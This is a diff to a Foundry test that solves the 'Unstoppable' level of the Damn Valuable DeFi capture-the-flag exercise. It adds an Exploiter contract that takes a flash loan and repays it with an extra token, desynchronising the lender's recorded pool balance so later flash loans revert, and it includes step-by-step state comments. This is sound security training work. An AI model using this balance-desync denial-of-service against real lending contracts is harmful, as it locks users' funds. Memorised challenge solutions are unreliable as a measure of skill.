@@ -3,10 +3,69 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
+import {console2} from "forge-std/console2.sol";
 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
+import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";
+
+interface IReceiver {
+    function receiveTokens(address tokenAddress, uint256 amount) external;
+}
+
+//  START
+
+// States
+// Lender Contract:
+// poolBalance = 1_000_000e18
+
+// Token Contract:
+// Unstoppable Lender: 1_000_000e18
+// Attacker: 100e18
+
+//STEP 1: Flash Loan 1e18,
+
+//STATE before IReceiver
+
+// Lender Contract:
+// poolBalance = 1_000_000e18
+
+// Token Contract:
+// Unstoppable Lender:999_999e18
+// Attacker: 101e18
+
+// Step 2 -> In Receive Tokens, transfer flash loan amount and 1 more ether to token contract
+
+// STATE
+
+// Lender Contract:
+// poolBalance = 1_000_000e18
+
+// Token Contract:
+// Unstoppable Lender : 1_000_001e18
+// Attacker 99e18
+
+contract Exploiter is IReceiver {
+    using SafeERC20 for IERC20;
+
+    UnstoppableLender public target;
+    address public owner;
+
+    constructor(address _target) {
+        target = UnstoppableLender(_target);
+        owner = msg.sender;
+    }
+
+    function attack1() public {
+        target.flashLoan(1e18);
+    }
+
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        IERC20(tokenAddress).transfer(address(target), amount + 1e18);
+    }
+}
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -60,9 +119,19 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+
+        Exploiter exploiter = new Exploiter(address(unstoppableLender));
+        //dvt.approve(address(dvt), 10e18);
+
+        dvt.transfer(address(exploiter), 10e18);
+        exploiter.attack1();
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
